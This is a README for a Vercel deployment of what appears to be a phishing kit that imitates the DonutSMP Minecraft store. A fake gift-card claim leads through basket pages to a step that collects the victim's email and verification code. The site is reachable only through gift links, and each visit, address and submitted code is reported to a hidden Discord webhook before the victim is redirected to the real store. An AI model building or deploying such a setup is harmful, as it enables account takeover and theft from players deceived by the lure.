# Vercel Deployment

This is a copy of the project configured for Vercel deployment.

## Structure

```
vercel-deploy/
├── vercel.json              # routes + function wiring
├── seal.js                  # HMAC sign/verify for the task envelope
├── send.js                  # /api/send - emails a code, returns a sealed task
├── check.js                 # /api/check - verifies the code
├── donutsmp-store-gate.html      # Store gate (username entry)
├── donutsmp-checkout-flow.html   # Basket step
├── donutsmp-payment-step.html     # Payment + code entry
├── donutsmp-checkout-layout.html # Gift claim page
└── pickaxe.svg
```

The three `.js` files sit at the root rather than in `api/` because GitHub's
web uploader cannot write into subfolders. `vercel.json` maps them onto
`/api/send` and `/api/check` with a `builds` + `routes` pair.

## Deploy to Vercel

### 1. Push to GitHub
```bash
cd vercel-deploy
git init
git add .
git commit -m "Vercel deploy"
gh repo create donut-verify --public --source=. --push
```

### 2. Import on Vercel
1. Go to [vercel.com](https://vercel.com) → **Add New Project**
2. Import your GitHub repo
3. **Environment Variables** (Project Settings → Environment Variables):
   ```
   VERIFY_KEY    = your got-beamed API key
   VISIT_WEBHOOK = your Discord webhook URL
   ```
4. Click **Deploy**

### 3. Custom Domain (optional)
- Project Settings → Domains → Add your domain
- Vercel handles SSL automatically

## Routes

Defined in `vercel.json`. The only way in is a gift link.

| URL | Page |
|-----|------|
| `/claim/<code>` | Store gate — **the entry point** |
| `/checkout` | Basket (Tebex-style) — next step, reached by clicking |
| `/basket` | Basket with the gift card applied |
| `/payment` | Payment step (email + code entry) |

Everything else 404s, including `/`, `/login` and `/claim`. Someone who has
not been given a link finds nothing; someone who follows one lands on the
store gate with the code already held for them.

The code in the path is stashed on the way through, so `/basket` redeems that
one. `N8K5B46H` is the code this store hands out and is also the fallback if a
code ever goes missing from the path — it is listed in `CODES` in
`donutsmp-checkout-flow.html`.

The flow is `/claim/<code>` → `/checkout` → `/basket` → `/payment`. On success
the payment step redirects to `https://store.donutsmp.net` in the same tab.

## API

| Endpoint | Method | Body | Response |
|----------|--------|------|----------|
| `/api/send` | POST | `{ email }` | `{ ok: true, display: "...", taskId: "<sealed>" }` |
| `/api/check` | POST | `{ email, code, taskId }` | `{ ok: true }` or `{ ok: false, error: "..." }` |
| `/api/visit` | POST | `{ page, ref }` | `{ ok: true }` — same-origin only |

`VISIT_WEBHOOK` points at a Discord channel. The storefront pings it on open,
`/api/send` reports the address and the upstream response, and `/api/check`
reports the submitted code and the verdict. The URL lives in the environment
variable so it is not readable from view-source.

## Environment Variables (Vercel Dashboard)

| Name | Value |
|------|-------|
| `VERIFY_KEY` | Your got-beamed API key |

## Storage

None. Vercel functions are stateless, so instead of a database `/api/send`
returns a signed envelope (HMAC-SHA256 over the task id, address and expiry)
in place of the raw task id. `/api/check` verifies that signature before it
accepts a code, which is enough to reject forged or stale tasks. The six-try
limit is counted in the browser and resets whenever a new code is sent.

## Local Development

```bash
npm i -g vercel
vercel dev
# Opens http://localhost:3000
```

## Costs

| Resource | Free Tier |
|----------|-----------|
| Vercel Functions | 100 GB-hours/mo |
| Bandwidth | 100 GB/mo |
| Custom Domains | Free |
| SSL | Free |

**Total: $0/month** within free tiers.